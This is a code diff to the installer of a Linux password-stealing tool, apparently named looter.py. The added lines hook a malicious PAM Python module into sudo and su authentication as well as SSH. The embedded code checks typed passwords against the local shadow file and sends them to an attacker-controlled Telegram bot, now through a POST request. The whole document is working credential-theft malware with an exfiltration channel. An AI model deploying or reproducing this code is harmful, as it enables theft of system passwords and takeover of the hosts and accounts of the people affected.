@@ -11,6 +11,14 @@ if ! grep -Fq "looter.py" /etc/pam.d/sshd;then
     sed -i "/common-auth/a auth requisite pam_python.so looter.py" /etc/pam.d/sshd
 fi
 
+if ! grep -Fq "looter.py" /etc/pam.d/sudo;then
+    sed -i "/common-auth/a auth requisite pam_python.so looter.py" /etc/pam.d/sudo
+fi
+
+if ! grep -Fq "looter.py" /etc/pam.d/su;then
+    sed -i "/common-auth/a auth requisite pam_python.so looter.py" /etc/pam.d/su
+fi
+
 code='
 import spwd
 import crypt
@@ -19,8 +27,9 @@ import requests
 def sendMessage(msg):
     apiKey = "API-KEY"
     userId = "USER-ID"
-    url = "https://api.telegram.org/bot{}/sendMessage?chat_id={}&text={}".format(apiKey,userId,msg)
-    r = requests.get(url)
+    data = {"chat_id":userId,"text":msg}
+    url = "https://api.telegram.org/bot{}/sendMessage".format(apiKey)
+    r = requests.post(url,json=data)
 
 def check_pw(user, password):
     """Check the password matches local unix password on file"""
